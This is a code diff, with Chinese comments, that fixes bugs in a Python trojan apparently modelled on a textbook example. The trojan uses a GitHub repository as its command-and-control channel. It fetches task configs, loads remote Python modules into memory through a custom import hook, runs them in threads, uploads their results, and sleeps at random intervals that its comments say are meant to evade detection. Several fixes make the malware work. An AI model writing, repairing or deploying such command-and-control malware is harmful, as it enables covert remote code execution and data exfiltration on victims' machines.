@@ -25,7 +25,8 @@ def github_connect():
 
     # 使用登录凭证初始化会话
     sess = github3.login(token=token)
-    return sess.repositories(user,repo_name)
+    # 【修复】：原代码使用 sess.repositories 返回的是生成器，应使用 sess.repository 获取具体仓库对象
+    return sess.repository(user, repo_name)
 
 '''
     =======官方代码如下=======
@@ -51,6 +52,7 @@ def get_file_contents(repo,filepath):
 
     except Exception as e:
         print(f"读取{filepath}/文件错误:{e}")
+        return None # 【修复】：增加返回None，防止后续调用崩溃
 
 
 def get_trojan_config(repo):
@@ -73,7 +75,8 @@ def store_module_result(repo,module_name,data):
 
     repo.create_file(
         path=remote_path,
-        message="Log:Update from active agent {trojan_id}",
+        # 【修复】：确保f-string正常解析
+        message=f"Log:Update from active agent {trojan_id}",
         content=b64_data
     )
 
@@ -90,15 +93,14 @@ class GitImporter:
         self.current_module_code = ""
 
     def find_module(self, fullname, path=None):
-        print(f"[*] 检索模块: {fullname}")
+        print(f"[*] 拦截到导入请求，正在检索远程模块: {fullname}")
 
         # 去 GitHub 的 modules 目录下寻找对应的 Python 源码
         code = get_file_contents(self.repo, f"models/{fullname}.py")
         if code:
             self.current_module_code = code
-            return self
+            return self  # 返回自身作为加载器
         return None
-
 
     def load_module(self, fullname):
         """在内存中动态组装并激活模块"""
@@ -121,7 +123,7 @@ def module_runner(repo,module_name):
         result = module.run()
 
         # 上传结果
-        store_module_result(repo,module_name,result)
+        store_module_result(repo,module_name,str(result)) # 确保结果是字符串
 
     except Exception as e:
         print(f"[-] 模块 {module_name} 执行失败: {e}")
@@ -142,13 +144,14 @@ def main():
         # 解析配置并利用多线程并发执行任务
         for task in config:
             target_module = task['module']
-            t = threading.Thread(target=module_runner,args=(repo,target_module))
+            # 【修复】：target 传入的是函数引用，args 传入参数元组，去掉了末尾的 ()
+            t = threading.Thread(target=module_runner, args=(repo, target_module))
             t.start()
             time.sleep(random.randint(1,3))
 
-            # 休眠一段时间（心跳周期），模拟正常流量避开检测
-            print("[*] 任务触发完毕，进入下一轮心跳休眠期...")
-            time.sleep(random.randint(10, 20))
+        # 休眠一段时间（心跳周期），模拟正常流量避开检测
+        print("[*] 任务触发完毕，进入下一轮心跳休眠期...")
+        time.sleep(random.randint(10, 20))
 
 
 if __name__ == "__main__":
